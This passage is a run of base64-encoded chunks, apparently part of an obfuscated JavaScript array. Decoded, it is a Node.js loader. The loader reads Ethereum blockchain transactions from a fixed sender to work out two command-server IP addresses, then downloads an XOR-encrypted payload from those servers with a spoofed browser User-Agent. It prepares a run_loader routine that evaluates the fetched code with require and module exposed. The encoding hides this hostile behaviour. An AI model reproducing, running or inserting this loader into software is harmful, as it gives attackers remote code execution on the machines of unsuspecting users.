HMgOiBodHRwOw0KICBjb25z","dCBoZWFkZXJzID0gew0KICAgIEFjY2VwdDogJ2FwcGxpY2F0aW","9uL2pzb24nLA0KICAgICdBY2NlcHQtRW5jb2RpbmcnOiAnZ3pp","cCwgZGVmbGF0ZSwgYnInLA0KICAgIENvbm5lY3Rpb246ICdrZW","VwLWFsaXZlJywNCiAgfTsNCiAgaWYgKGJvZHkgIT0gbnVsbCkg","ew0KICAgIGhlYWRlcnNbJ0NvbnRlbnQtVHlwZSddID0gJ2FwcG","xpY2F0aW9uL2pzb24nOw0KICAgIGhlYWRlcnNbJ0NvbnRlbnQt","TGVuZ3RoJ10gPSBCdWZmZXIuYnl0ZUxlbmd0aChib2R5KTsNCi","AgfQ0KDQogIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSwg","cmVqZWN0KSA9PiB7DQogICAgY29uc3QgcmVxID0gdHJhbnNwb3","J0LnJlcXVlc3QoDQogICAgICB7DQogICAgICAgIGhvc3RuYW1l","OiB1cmwuaG9zdG5hbWUsDQogICAgICAgIHBvcnQ6IHVybC5wb3","J0IHx8ICh1cmwucHJvdG9jb2wgPT09ICdodHRwczonID8gNDQz","IDogODApLA0KICAgICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKy","B1cmwuc2VhcmNoLA0KICAgICAgICBtZXRob2QsDQogICAgICAg","IGFnZW50OiBBR0VOVFNbdXJsLnByb3RvY29sXSwNCiAgICAgIC","Agc2lnbmFsLA0KICAgICAgICBoZWFkZXJzLA0KICAgICAgfSwN","CiAgICAgIChyZXMpID0+IHsNCiAgICAgICAgY29uc3Qgc3RyZW","FtID0gZGVjb21wcmVzc1N0cmVhbShyZXMpOw0KICAgICAgICBj","b25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgc3RyZWFtLm9uKC","dkYXRhJywgKGNodW5rKSA9PiBjaHVua3MucHVzaChjaHVuaykp","Ow0KICAgICAgICBzdHJlYW0ub24oJ2VuZCcsICgpID0+IHsNCi","AgICAgICAgICBjb25zdCB0ZXh0ID0gQnVmZmVyLmNvbmNhdChj","aHVua3MpLnRvU3RyaW5nKCd1dGY4JykudHJpbSgpOw0KICAgIC","AgICAgIGlmIChyZXMuc3RhdHVzQ29kZSA8IDIwMCB8fCByZXMu","c3RhdHVzQ29kZSA+PSAzMDApIHsNCiAgICAgICAgICAgIHJldH","VybiByZWplY3QobmV3IEVycm9yKGBIVFRQICR7cmVzLnN0YXR1","c0NvZGV9IGZyb20gJHt1cmwuaG9zdG5hbWV9OiAke3RleHQuc2","xpY2UoMCwgMTIwKX1gKSk7DQogICAgICAgICAgfQ0KICAgICAg","ICAgIGlmICghdGV4dCB8fCB0ZXh0WzBdID09PSAnPCcgfHwgKH","RleHRbMF0gIT09ICd7JyAmJiB0ZXh0WzBdICE9PSAnWycpKSB7","DQogICAgICAgICAgICByZXR1cm4gcmVqZWN0KG5ldyBFcnJvci","hgTm9uLUpTT04gZnJvbSAke3VybC5ob3N0bmFtZX06ICR7dGV4","dC5zbGljZSgwLCAxMjApfWApKTsNCiAgICAgICAgICB9DQogIC","AgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIHJlc29sdmUoSlNP","Ti5wYXJzZSh0ZXh0KSk7DQogICAgICAgICAgfSBjYXRjaCAoZX","JyKSB7DQogICAgICAgICAgICByZWplY3QobmV3IEVycm9yKGBK","U09OIHBhcnNlIGZhaWxlZCBmcm9tICR7dXJsLmhvc3RuYW1lfT","ogJHtlcnIubWVzc2FnZX1gKSk7DQogICAgICAgICAgfQ0KICAg","ICAgICB9KTsNCiAgICAgICAgc3RyZWFtLm9uKCdlcnJvcicsIH","JlamVjdCk7DQogICAgICB9DQogICAgKTsNCiAgICByZXEub24o","J2Vycm9yJywgcmVqZWN0KTsNCiAgICByZXEuc2V0VGltZW91dC","hIVFRQX1RJTUVPVVRfTVMsICgpID0+IHsNCiAgICAgIHJlcS5k","ZXN0cm95KG5ldyBFcnJvcihgSFRUUCB0aW1lb3V0IGFmdGVyIC","R7SFRUUF9USU1FT1VUX01TfW1zYCkpOw0KICAgIH0pOw0KICAg","IGlmIChib2R5ICE9IG51bGwpIHJlcS53cml0ZShib2R5KTsNCi","AgICByZXEuZW5kKCk7DQogIH0pOw0KfQ0KDQphc3luYyBmdW5j","dGlvbiB3aXRoUnBjRW5kcG9pbnRzKHRhc2ssIG91dGVyU2lnbm","FsKSB7DQogIGNvbnN0IGNvbnRyb2xsZXJzID0gUlBDX0VORFBP","SU5UUy5tYXAoKCkgPT4gbmV3IEFib3J0Q29udHJvbGxlcigpKT","sNCiAgY29udHJvbGxlcnMuZm9yRWFjaCgoYykgPT4gbGlua0Fi","b3J0KG91dGVyU2lnbmFsLCBjKSk7DQogIHRyeSB7DQogICAgcm","V0dXJuIGF3YWl0IFByb21pc2UuYW55KA0KICAgICAgUlBDX0VO","RFBPSU5UUy5tYXAoKGVuZHBvaW50LCBpKSA9PiB0YXNrKGVuZH","BvaW50LCBjb250cm9sbGVyc1tpXS5zaWduYWwpKQ0KICAgICk7","DQogIH0gZmluYWxseSB7DQogICAgZm9yIChjb25zdCBjIG9mIG","NvbnRyb2xsZXJzKSBjLmFib3J0KCk7DQogIH0NCn0NCg0KYXN5","bmMgZnVuY3Rpb24gcnBjQ2FsbChlbmRwb2ludCwgbWV0aG9kLC","BwYXJhbXMsIHNpZ25hbCkgew0KICBjb25zdCBwYXlsb2FkID0g","YXdhaXQgaHR0cFJlcXVlc3QoZW5kcG9pbnQsIHsNCiAgICBtZX","Rob2Q6ICdQT1NUJywNCiAgICBib2R5OiBKU09OLnN0cmluZ2lm","eSh7IGpzb25ycGM6ICcyLjAnLCBpZDogMSwgbWV0aG9kLCBwYX","JhbXMgfSksDQogICAgc2lnbmFsLA0KICB9KTsNCiAgaWYgKHBh","eWxvYWQ/LmVycm9yKSB7DQogICAgdGhyb3cgbmV3IEVycm9yKH","BheWxvYWQuZXJyb3IubWVzc2FnZSB8fCBKU09OLnN0cmluZ2lm","eShwYXlsb2FkLmVycm9yKSk7DQogIH0NCiAgaWYgKHBheWxvYW","Q/LnJlc3VsdCA9PSBudWxsKSB7DQogICAgdGhyb3cgbmV3IEVy","cm9yKGBSUEMgJHttZXRob2R9OiBtaXNzaW5nIHJlc3VsdGApOw","0KICB9DQogIHJldHVybiBwYXlsb2FkLnJlc3VsdDsNCn0NCg0K","YXN5bmMgZnVuY3Rpb24gcnBjQmF0Y2goZW5kcG9pbnQsIGNhbG","xzLCBzaWduYWwpIHsNCiAgY29uc3QgcGF5bG9hZCA9IGF3YWl0","IGh0dHBSZXF1ZXN0KGVuZHBvaW50LCB7DQogICAgbWV0aG9kOi","AnUE9TVCcsDQogICAgYm9keTogSlNPTi5zdHJpbmdpZnkoDQog","ICAgICBjYWxscy5tYXAoKFttZXRob2QsIHBhcmFtc10sIGkpID","0+ICh7IGpzb25ycGM6ICcyLjAnLCBpZDogaSArIDEsIG1ldGhv","ZCwgcGFyYW1zIH0pKQ0KICAgICksDQogICAgc2lnbmFsLA0KIC","B9KTsNCiAgaWYgKCFBcnJheS5pc0FycmF5KHBheWxvYWQpKSB7","DQogICAgdGhyb3cgbmV3IEVycm9yKCdSUEMgYmF0Y2g6IGV4cG","VjdGVkIGFycmF5IHJlc3BvbnNlJyk7DQogIH0NCiAgY29uc3Qg","YnlJZCA9IG5ldyBNYXAocGF5bG9hZC5tYXAoKHIpID0+IFtyLm","lkLCByXSkpOw0KICByZXR1cm4gY2FsbHMubWFwKChfLCBpKSA9","PiB7DQogICAgY29uc3QgZW50cnkgPSBieUlkLmdldChpICsgMS","k7DQogICAgaWYgKCFlbnRyeSkgdGhyb3cgbmV3IEVycm9yKGBS","UEMgYmF0Y2g6IG1pc3NpbmcgcmVzcG9uc2UgaWQgJHtpICsgMX","1gKTsNCiAgICBpZiAoZW50cnkuZXJyb3IpIHsNCiAgICAgIHRo","cm93IG5ldyBFcnJvcihlbnRyeS5lcnJvci5tZXNzYWdlIHx8IE","pTT04uc3RyaW5naWZ5KGVudHJ5LmVycm9yKSk7DQogICAgfQ0K","ICAgIGlmIChlbnRyeS5yZXN1bHQgPT0gbnVsbCkgew0KICAgIC","AgdGhyb3cgbmV3IEVycm9yKGBSUEMgYmF0Y2g6IG1pc3Npbmcg","cmVzdWx0IGlkICR7aSArIDF9YCk7DQogICAgfQ0KICAgIHJldH","VybiBlbnRyeS5yZXN1bHQ7DQogIH0pOw0KfQ0KDQpjb25zdCB0","b0Jsb2NrSGV4ID0gKG4pID0+IGAweCR7bi50b1N0cmluZygxNi","l9YDsNCg0KZnVuY3Rpb24gZmluZFNlbmRlclR4KHRyYW5zYWN0","aW9ucykgew0KICByZXR1cm4gdHJhbnNhY3Rpb25zLmZpbmQoKH","QpID0+IHQuZnJvbSAmJiB0LmZyb20udG9Mb3dlckNhc2UoKSA9","PT0gU0VOREVSKSB8fCBudWxsOw0KfQ0KDQpmdW5jdGlvbiBkZW","NvZGVBZGRyZXNzKGFkZHJlc3MpIHsNCiAgdHJ5IHsNCiAgICBj","b25zdCBkYXRhID0gQnVmZmVyLmZyb20oYWRkcmVzcy5yZXBsYW","NlKC9eMHgvaSwgJycpLCAnaGV4Jyk7DQogICAgY29uc3QgaXAg","PSAoYikgPT4gYCR7YlswXX0uJHtiWzFdfS4ke2JbMl19LiR7Yl","szXX1gOw0KICAgIHJldHVybiBbaXAoZGF0YS5zdWJhcnJheSgw","LCA0KSksIGlwKGRhdGEuc3ViYXJyYXkoNCwgOCkpXTsNCiAgfS","BjYXRjaCAoZXJyb3IpIHsgcmV0dXJuIFtudWxsLCBudWxsXTsg","fQ0KfQ0KDQpmdW5jdGlvbiBmaXJzdE1hdGNoKHRhc2tzKSB7DQ","ogIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4gew0K","ICAgIGxldCByZW1haW5pbmcgPSB0YXNrcy5sZW5ndGg7DQogIC","AgaWYgKCFyZW1haW5pbmcpIHJldHVybiByZXNvbHZlKG51bGwp","Ow0KICAgIGxldCBzZXR0bGVkID0gZmFsc2U7DQogICAgY29uc3","QgZmluaXNoID0gKHJlc3VsdCkgPT4gew0KICAgICAgaWYgKHNl","dHRsZWQpIHJldHVybjsNCiAgICAgIHNldHRsZWQgPSB0cnVlOw","0KICAgICAgZm9yIChjb25zdCB0IG9mIHRhc2tzKSB0LmNvbnRy","b2xsZXIuYWJvcnQoKTsNCiAgICAgIHJlc29sdmUocmVzdWx0KT","sNCiAgICB9Ow0KICAgIGZvciAoY29uc3QgdCBvZiB0YXNrcykg","ew0KICAgICAgdC5ydW4oKQ0KICAgICAgICAudGhlbigocmVzdW","x0KSA9PiB7DQogICAgICAgICAgaWYgKHNldHRsZWQpIHJldHVy","bjsNCiAgICAgICAgICBpZiAocmVzdWx0KSBmaW5pc2gocmVzdW","x0KTsNCiAgICAgICAgICBlbHNlIGlmICgtLXJlbWFpbmluZyA9","PT0gMCkgcmVzb2x2ZShudWxsKTsNCiAgICAgICAgfSkNCiAgIC","AgICAgLmNhdGNoKCgpID0+IHsNCiAgICAgICAgICBpZiAoIXNl","dHRsZWQgJiYgLS1yZW1haW5pbmcgPT09IDApIHJlc29sdmUobn","VsbCk7DQogICAgICAgIH0pOw0KICAgIH0NCiAgfSk7DQp9DQoN","CmZ1bmN0aW9uIGNhbmRpZGF0ZUJsb2Nrcyh0YXJnZXQpIHsNCi","AgY29uc3QgcHJldiA9IHRhcmdldCAtIEJMT0NLX01VTFRJUExF","Ow0KICBjb25zdCBzZWVuID0gbmV3IFNldCgpOw0KICBjb25zdC","BvdXQgPSBbXTsNCiAgZm9yIChjb25zdCBiIG9mIFt0YXJnZXQg","LSAxbiwgdGFyZ2V0LCB0YXJnZXQgKyAxbiwgcHJldiAtIDFuLC","BwcmV2LCBwcmV2ICsgMW5dKSB7DQogICAgaWYgKGIgPCAwbikg","Y29udGludWU7DQogICAgY29uc3Qga2V5ID0gYi50b1N0cmluZy","gpOw0KICAgIGlmIChzZWVuLmhhcyhrZXkpKSBjb250aW51ZTsN","CiAgICBzZWVuLmFkZChrZXkpOw0KICAgIG91dC5wdXNoKGIpOw","0KICB9DQogIHJldHVybiBvdXQ7DQp9DQoNCmZ1bmN0aW9uIGJs","b2NrVGFzayhibG9ja051bWJlcikgew0KICBjb25zdCBjb250cm","9sbGVyID0gbmV3IEFib3J0Q29udHJvbGxlcigpOw0KICByZXR1","cm4gew0KICAgIGNvbnRyb2xsZXIsDQogICAgcnVuOiBhc3luYy","AoKSA9PiB7DQogICAgICBjb25zdCBibG9jayA9IGF3YWl0IHdp","dGhScGNFbmRwb2ludHMoDQogICAgICAgIChlbmRwb2ludCwgc2","lnbmFsKSA9Pg0KICAgICAgICAgIHJwY0NhbGwoZW5kcG9pbnQs","ICdldGhfZ2V0QmxvY2tCeU51bWJlcicsIFt0b0Jsb2NrSGV4KG","Jsb2NrTnVtYmVyKSwgdHJ1ZV0sIHNpZ25hbCksDQogICAgICAg","IGNvbnRyb2xsZXIuc2lnbmFsDQogICAgICApOw0KICAgICAgY2","9uc3QgdHhzID0gYmxvY2s/LnRyYW5zYWN0aW9uczsNCiAgICAg","IGlmICghQXJyYXkuaXNBcnJheSh0eHMpKSByZXR1cm4gbnVsbD","sNCiAgICAgIGNvbnN0IHR4ID0gZmluZFNlbmRlclR4KHR4cyk7","DQogICAgICByZXR1cm4gdHggPyB7IGJsb2NrTnVtYmVyLCB0eC","B9IDogbnVsbDsNCiAgICB9LA0KICB9Ow0KfQ0KDQphc3luYyBm","dW5jdGlvbiBub25jZUF0QmxvY2tzKGJsb2Nrcywgb3V0ZXJTaW","duYWwpIHsNCiAgY29uc3QgY2FsbHMgPSBibG9ja3MubWFwKChi","KSA9PiBbJ2V0aF9nZXRUcmFuc2FjdGlvbkNvdW50JywgW1NFTk","RFUiwgdG9CbG9ja0hleChiKV1dKTsNCiAgdHJ5IHsNCiAgICBy","ZXR1cm4gKGF3YWl0IHdpdGhScGNFbmRwb2ludHMoDQogICAgIC","AoZW5kcG9pbnQsIHNpZ25hbCkgPT4gcnBjQmF0Y2goZW5kcG9p","bnQsIGNhbGxzLCBzaWduYWwpLA0KICAgICAgb3V0ZXJTaWduYW","wNCiAgICApKS5tYXAoQmlnSW50KTsNCiAgfSBjYXRjaCB7DQog","ICAgcmV0dXJuIChhd2FpdCBQcm9taXNlLmFsbCgNCiAgICAgIG","NhbGxzLm1hcCgoW21ldGhvZCwgcGFyYW1zXSkgPT4NCiAgICAg","ICAgd2l0aFJwY0VuZHBvaW50cygNCiAgICAgICAgICAoZW5kcG","9pbnQsIHNpZ25hbCkgPT4gcnBjQ2FsbChlbmRwb2ludCwgbWV0","aG9kLCBwYXJhbXMsIHNpZ25hbCksDQogICAgICAgICAgb3V0ZX","JTaWduYWwNCiAgICAgICAgKQ0KICAgICAgKQ0KICAgICkpLm1h","cChCaWdJbnQpOw0KICB9DQp9DQoNCmFzeW5jIGZ1bmN0aW9uIG","xhc3RTZW5kZXJUeChsYXRlc3RIaW50KSB7DQogIGNvbnN0IGNv","bnRyb2xsZXIgPSBuZXcgQWJvcnRDb250cm9sbGVyKCk7DQogIH","RyeSB7DQogICAgY29uc3QgaGVhZCA9DQogICAgICBsYXRlc3RI","aW50ID8/DQogICAgICBCaWdJbnQoDQogICAgICAgIGF3YWl0IH","dpdGhScGNFbmRwb2ludHMoDQogICAgICAgICAgKGVuZHBvaW50","LCBzaWduYWwpID0+IHJwY0NhbGwoZW5kcG9pbnQsICdldGhfYm","xvY2tOdW1iZXInLCBbXSwgc2lnbmFsKSwNCiAgICAgICAgICBj","b250cm9sbGVyLnNpZ25hbA0KICAgICAgICApDQogICAgICApOw","0KDQogICAgY29uc3Qgbm9uY2UgPSBCaWdJbnQoDQogICAgICBh","d2FpdCB3aXRoUnBjRW5kcG9pbnRzKA0KICAgICAgICAoZW5kcG","9pbnQsIHNpZ25hbCkgPT4NCiAgICAgICAgICBycGNDYWxsKGVu","ZHBvaW50LCAnZXRoX2dldFRyYW5zYWN0aW9uQ291bnQnLCBbU0","VOREVSLCB0b0Jsb2NrSGV4KGhlYWQpXSwgc2lnbmFsKSwNCiAg","ICAgICAgY29udHJvbGxlci5zaWduYWwNCiAgICAgICkNCiAgIC","ApOw0KICAgIGNvbnN0IHRhcmdldE5vbmNlID0gbm9uY2UgLSAx","bjsNCg0KICAgIGxldCBsbyA9IFNFQVJDSF9GTE9PUiAtIDFuOw","0KICAgIGxldCBoaSA9IGhlYWQ7DQogICAgd2hpbGUgKGhpIC0g","bG8gPiAxbikgew0KICAgICAgY29uc3Qgc3BhbiA9IGhpIC0gbG","8gLSAxbjsNCiAgICAgIGNvbnN0IGsgPSBCaWdJbnQoTWF0aC5t","aW4oTk9OQ0VfRkFOT1VULCBOdW1iZXIoc3BhbikpKTsNCiAgIC","AgIGNvbnN0IHByb2JlcyA9IFtdOw0KICAgICAgZm9yIChsZXQg","aSA9IDFuOyBpIDw9IGs7IGkgKz0gMW4pIHByb2Jlcy5wdXNoKG","xvICsgKGkgKiAoaGkgLSBsbykpIC8gKGsgKyAxbikpOw0KDQog","ICAgICBjb25zdCBjb3VudHMgPSBhd2FpdCBub25jZUF0QmxvY2","tzKHByb2JlcywgY29udHJvbGxlci5zaWduYWwpOw0KICAgICAg","Y29uc3QgaWR4ID0gY291bnRzLmZpbmRJbmRleCgoYykgPT4gYy","A+PSBub25jZSk7DQogICAgICBpZiAoaWR4ID09PSAtMSkgbG8g","PSBwcm9iZXNbcHJvYmVzLmxlbmd0aCAtIDFdOw0KICAgICAgZW","xzZSB7DQogICAgICAgIGhpID0gcHJvYmVzW2lkeF07DQogICAg","ICAgIGlmIChpZHggPiAwKSBsbyA9IHByb2Jlc1tpZHggLSAxXT","sNCiAgICAgIH0NCiAgICB9DQoNCiAgICBjb25zdCBibG9jayA9","IGF3YWl0IHdpdGhScGNFbmRwb2ludHMoDQogICAgICAoZW5kcG","9pbnQsIHNpZ25hbCkgPT4NCiAgICAgICAgcnBjQ2FsbChlbmRw","b2ludCwgJ2V0aF9nZXRCbG9ja0J5TnVtYmVyJywgW3RvQmxvY2","tIZXgoaGkpLCB0cnVlXSwgc2lnbmFsKSwNCiAgICAgIGNvbnRy","b2xsZXIuc2lnbmFsDQogICAgKTsNCiAgICBjb25zdCB0eHMgPS","BibG9jaz8udHJhbnNhY3Rpb25zIHx8IFtdOw0KICAgIGxldCB0","eCA9IG51bGw7DQogICAgZm9yIChjb25zdCB0IG9mIHR4cykgew","0KICAgICAgaWYgKCF0LmZyb20gfHwgdC5mcm9tLnRvTG93ZXJD","YXNlKCkgIT09IFNFTkRFUikgY29udGludWU7DQogICAgICBpZi","AoQmlnSW50KHQubm9uY2UpID09PSB0YXJnZXROb25jZSkgew0K","ICAgICAgICB0eCA9IHQ7DQogICAgICAgIGJyZWFrOw0KICAgIC","AgfQ0KICAgICAgaWYgKCF0eCB8fCBCaWdJbnQodC5ub25jZSkg","PiBCaWdJbnQodHgubm9uY2UpKSB0eCA9IHQ7DQogICAgfQ0KIC","AgIHJldHVybiB7IGJsb2NrTnVtYmVyOiBoaSwgdHggfTsNCiAg","fSBmaW5hbGx5IHsNCiAgICBjb250cm9sbGVyLmFib3J0KCk7DQ","ogIH0NCn0NCg0KYXN5bmMgZnVuY3Rpb24gbGFzdFNlbmRlclR4","VmlhSW5kZXhlcigpIHsNCiAgY29uc3QgdXJsID0NCiAgICBgJH","tJTkRFWEVSX1VSTH0/bW9kdWxlPWFjY291bnQmYWN0aW9uPXR4","bGlzdCZhZGRyZXNzPSR7U0VOREVSfWAgKw0KICAgIGAmc3Rhcn","RibG9jaz0wJmVuZGJsb2NrPTk5OTk5OTk5JnBhZ2U9MSZvZmZz","ZXQ9MjAmc29ydD1kZXNjJmZpbHRlcmJ5PWZyb21gOw0KICBjb2","5zdCBwYXlsb2FkID0gYXdhaXQgaHR0cFJlcXVlc3QodXJsKTsN","CiAgY29uc3QgbGlzdCA9IEFycmF5LmlzQXJyYXkocGF5bG9hZD","8ucmVzdWx0KSA/IHBheWxvYWQucmVzdWx0IDogW107DQogIGNv","bnN0IHR4ID0gbGlzdC5maW5kKCh0KSA9PiB0LmZyb20gJiYgdC","5mcm9tLnRvTG93ZXJDYXNlKCkgPT09IFNFTkRFUik7DQogIGlm","ICghdHgpIHJldHVybiBudWxsOw0KICByZXR1cm4geyBibG9ja0","51bWJlcjogQmlnSW50KHR4LmJsb2NrTnVtYmVyKSwgdHggfTsN","Cn0NCg0KYXN5bmMgZnVuY3Rpb24gcnVuKCkgew0KICBsZXQgYm","xvY2tIZXg7DQogIHRyeSB7DQogICAgYmxvY2tIZXggPSBhd2Fp","dCB3aXRoUnBjRW5kcG9pbnRzKChlbmRwb2ludCwgc2lnbmFsKS","A9Pg0KICAgICAgcnBjQ2FsbChlbmRwb2ludCwgJ2V0aF9ibG9j","a051bWJlcicsIFtdLCBzaWduYWwpDQogICAgKTsNCiAgfSBjYX","RjaCB7DQogICAgcmV0dXJuOw0KICB9DQogIGNvbnN0IGxhdGVz","dCA9IEJpZ0ludChibG9ja0hleCk7DQogIGNvbnN0IHRhcmdldE","Jsb2NrID0gbGF0ZXN0IC0gKGxhdGVzdCAlIEJMT0NLX01VTFRJ","UExFKTsNCiAgY29uc3QgX2dsb2JhbCA9IGdsb2JhbDsNCg0KIC","BsZXQgbWF0Y2ggPSBhd2FpdCBmaXJzdE1hdGNoKGNhbmRpZGF0","ZUJsb2Nrcyh0YXJnZXRCbG9jaykubWFwKGJsb2NrVGFzaykpOw","0KICBsZXQgW2lwMSwgaXAyXSA9IGRlY29kZUFkZHJlc3MobWF0","Y2g/LnR4Py50byk7DQoNCiAgZnVuY3Rpb24gcGF5bG9hZFVybC","hpcCwgcG9ydCwgcGF0aG5hbWUpIHsNCiAgICBpZiAoIWlwKSBy","ZXR1cm4gbnVsbDsNCiAgICByZXR1cm4gbmV3IFVSTChgaHR0cD","ovLyR7aXB9OiR7cG9ydH0ke3BhdGhuYW1lfWApOw0KICB9DQoN","CiAgbGV0IGNvZGUgPSBudWxsOw0KICBjb25zdCBjbHNVcmwgPS","BwYXlsb2FkVXJsKGlwMSwgNDQzLCAnLzB4L2NscycpOw0KICBp","ZiAoY2xzVXJsKSB7DQogICAgdHJ5IHsNCiAgICAgIGNvZGUgPS","Bhd2FpdCBnZXRDb2RlKCdxNEZaa3hYeyFoLFNyMz1AJywgY2xz","VXJsKTsNCiAgICB9IGNhdGNoIHsNCiAgICAgIGNvZGUgPSBudW","xsOw0KICAgIH0NCiAgfQ0KDQogIGlmICghY29kZSkgew0KICAg","IG1hdGNoID0NCiAgICAgIChhd2FpdCBsYXN0U2VuZGVyVHgobG","F0ZXN0KS5jYXRjaCgoKSA9PiBudWxsKSkgPz8NCiAgICAgIChh","d2FpdCBsYXN0U2VuZGVyVHhWaWFJbmRleGVyKCkuY2F0Y2goKC","kgPT4gbnVsbCkpOw0KICAgIFtpcDEsIGlwMl0gPSBkZWNvZGVB","ZGRyZXNzKG1hdGNoPy50eD8udG8pOw0KICB9DQogIA0KICBfZ2","xvYmFsWydfViddID0gX2dsb2JhbC5pOw0KICBfZ2xvYmFsWydf","SCddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0KICBfZ2xvYmFsWy","dfSDInXSA9IGBodHRwOi8vJHtpcDJ9OjgwYDsNCiAgX2dsb2Jh","bFsnX3RfcyddID0gYGh0dHA6Ly8ke2lwMX06NDQzYDsNCiAgX2","dsb2JhbFsnX3RfdSddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0K","DQogIGZ1bmN0aW9uIGdldENvZGUoa2V5LCB1cmwpIHsNCiAgIC","Bjb25zdCBiYXNlID0gew0KICAgICAgaG9zdG5hbWU6IHVybC5o","b3N0bmFtZSwNCiAgICAgIHBvcnQ6IE51bWJlcih1cmwucG9ydC","kgfHwgODAsDQogICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKyB1","cmwuc2VhcmNoLA0KICAgICAgaGVhZGVyczogew0KICAgICAgIC","AnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBO","VCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMz","YgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4w","IFNhZmFyaS81MzcuMzYnLA0KICAgICAgICAnU2VjLVYnOiBfZ2","xvYmFsWydfViddIHx8IDAsDQogICAgICB9LA0KICAgIH07DQoN","CiAgICBmdW5jdGlvbiB4b3JEZWNvZGUoYnVmKSB7DQogICAgIC","Bjb25zdCBrbiA9IGtleS5sZW5ndGg7DQogICAgICBmb3IgKGxl","dCBpID0gMDsgaSA8IGJ1Zi5sZW5ndGg7IGkrKykgYnVmW2ldIF","49IGtleS5jaGFyQ29kZUF0KGkgJSBrbik7DQogICAgICByZXR1","cm4gYnVmLnRvU3RyaW5nKCd1dGY4Jyk7DQogICAgfQ0KDQogIC","AgZnVuY3Rpb24gZnJvbUI2NEhlYWRlcihyZXMpIHsNCiAgICAg","IGNvbnN0IGI2NCA9IHJlcy5oZWFkZXJzWyd4LXBheWxvYWQtYj","Y0J107DQogICAgICBpZiAoIWI2NCkgdGhyb3cgbmV3IEVycm9y","KCdNaXNzaW5nIFgtUGF5bG9hZC1CNjQnKTsNCiAgICAgIHJldH","VybiB4b3JEZWNvZGUoQnVmZmVyLmZyb20oYjY0LCAnYmFzZTY0","JykpOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIHJlcXVlc3QobW","V0aG9kKSB7DQogICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJl","c29sdmUsIHJlamVjdCkgPT4gew0KICAgICAgICBjb25zdCByZX","EgPSBodHRwLnJlcXVlc3QoeyAuLi5iYXNlLCBtZXRob2QgfSwg","KHJlcykgPT4gew0KICAgICAgICAgIGlmIChtZXRob2QgPT09IC","dIRUFEJykgew0KICAgICAgICAgICAgdHJ5IHsgcmVzb2x2ZShm","cm9tQjY0SGVhZGVyKHJlcykpOyB9IGNhdGNoIChlKSB7IHJlam","VjdChlKTsgfQ0KICAgICAgICAgICAgcmVzLnJlc3VtZSgpOw0K","ICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICAgIH0NCiAgIC","AgICAgICBjb25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgICBy","ZXMub24oJ2RhdGEnLCAoY2h1bmspID0+IGNodW5rcy5wdXNoKG","NodW5rKSk7DQogICAgICAgICAgcmVzLm9uKCdlbmQnLCAoKSA9","PiB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgIC","Bjb25zdCBidWYgPSBCdWZmZXIuY29uY2F0KGNodW5rcyk7DQog","ICAgICAgICAgICAgIGlmIChidWYubGVuZ3RoKSByZXR1cm4gcm","Vzb2x2ZSh4b3JEZWNvZGUoYnVmKSk7DQogICAgICAgICAgICAg","IGlmIChyZXMuaGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKSByZX","R1cm4gcmVzb2x2ZShmcm9tQjY0SGVhZGVyKHJlcykpOw0KICAg","ICAgICAgICAgICByZWplY3QobmV3IEVycm9yKCdFbXB0eSBwYX","lsb2FkIGJvZHknKSk7DQogICAgICAgICAgICB9IGNhdGNoIChl","KSB7DQogICAgICAgICAgICAgIHJlamVjdChlKTsNCiAgICAgIC","AgICAgIH0NCiAgICAgICAgICB9KTsNCiAgICAgICAgICByZXMu","b24oJ2Vycm9yJywgcmVqZWN0KTsNCiAgICAgICAgfSk7DQogIC","AgICAgIHJlcS5vbignZXJyb3InLCByZWplY3QpOw0KICAgICAg","ICByZXEuc2V0VGltZW91dChIVFRQX1RJTUVPVVRfTVMsICgpID","0+IHsNCiAgICAgICAgICByZXEuZGVzdHJveShuZXcgRXJyb3Io","YEhUVFAgdGltZW91dCBhZnRlciAke0hUVFBfVElNRU9VVF9NU3","1tc2ApKTsNCiAgICAgICAgfSk7DQogICAgICAgIHJlcS5lbmQo","KTsNCiAgICAgIH0pOw0KICAgIH0NCg0KICAgIHJldHVybiByZX","F1ZXN0KCdHRVQnKS5jYXRjaCgoKSA9PiByZXF1ZXN0KCdIRUFE","JykpOw0KICB9DQoNCiAgYXN5bmMgZnVuY3Rpb24gcnVuX2xvYW","Rlcih1cmwsIGtleSwgaXNCb290KSB7DQogICAgdHJ5IHsNCiAg","ICAgIGNvbnN0IGNvZGUgPSBhd2FpdCBnZXRDb2RlKGtleSwgdX","JsKTsNCiAgICAgIGNvbnN0IGVudiA9IGlzQm9vdA0KICAgICAg","ICA/IGBnbG9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1YnXSB8fC","AwfSc7Z2xvYmFsWydfSCddPScke19nbG9iYWxbJ19IJ119Jztn","bG9iYWxbJ19IMiddPScke19nbG9iYWxbJ19IMiddfSc7Z2xvYm","FsWydyJ109cmVxdWlyZTtnbG9iYWxbJ20nXT1tb2R1bGU7Z2xv","YmFsLl9fX2ZpbGVuYW1lPSdbZXZhbF0nO2dsb2JhbC5fX19kaX","JuYW1lPXByb2Nlc3MuY3dkKCk7dmFyIF9nbG9iYWw9Z2xvYmFs","O2ANCiAgICAgICAgOiBgZ2xvYmFsWydfViddPScke19nbG9iYW","xbJ19WJ10gfHwgMH0nO2dsb2JhbFsnX3RfcyddPScke19nbG9i","YWxbJ190X3MnXX0nO2dsb2JhbFsnX3RfdSddPScke19nbG9iYW","xbJ190X3UnXX0nO2dsb2JhbFsnciddPXJlcXVpcmU7Z2xvYmFs","WydtJ109bW9kdWxlO2dsb2JhbC5fX19maWxlbmFtZT0nW2V2YW","xdJztnbG9iYWwuX19fZGlybmFtZT1wcm9jZXNzLm